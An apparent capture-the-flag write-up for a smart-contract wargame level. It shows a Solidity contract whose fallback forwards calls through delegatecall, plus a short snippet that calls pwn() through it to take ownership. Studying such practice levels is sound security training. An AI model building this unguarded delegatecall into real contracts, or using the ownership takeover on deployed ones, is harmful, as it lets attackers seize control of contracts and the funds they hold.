---
title: Level-6
---
## Code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract Delegate {
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

```

## Solution
 Just delegatecall the `pwn()` , it will effect context of Contract `Delegation`.

 ```solidity

    bytes4 methodHash = bytes4(keccak256("pwn()"));

    // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
    address(Delegation).call(abi.encode(methodHash));

 ```